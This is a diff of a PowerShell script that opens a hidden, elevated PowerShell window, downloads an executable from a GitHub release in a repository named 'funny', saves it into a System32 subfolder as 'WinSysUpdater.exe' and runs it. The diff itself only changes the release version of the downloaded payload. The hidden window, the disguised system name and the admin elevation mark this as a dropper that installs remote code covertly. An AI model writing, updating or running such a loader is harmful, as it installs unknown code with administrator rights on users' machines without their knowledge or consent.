@@ -15,7 +15,7 @@ Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -Command `"
     };
     cd 'C:\Windows\System32\DiagLogs';
     Write-Host 'Downloading WinSysUpdater.exe...';
-    Invoke-WebRequest -Uri 'https://github.com/greenstorm5417/funny/releases/download/v1.1.1/main.exe' -OutFile 'WinSysUpdater.exe' -UseBasicParsing;
+    Invoke-WebRequest -Uri 'https://github.com/greenstorm5417/funny/releases/download/v1.1.2/main.exe' -OutFile 'WinSysUpdater.exe' -UseBasicParsing;
     Write-Host 'Downloaded WinSysUpdater.exe.';
     Start-Process .\WinSysUpdater.exe;
 `"" -Verb RunAs; exit
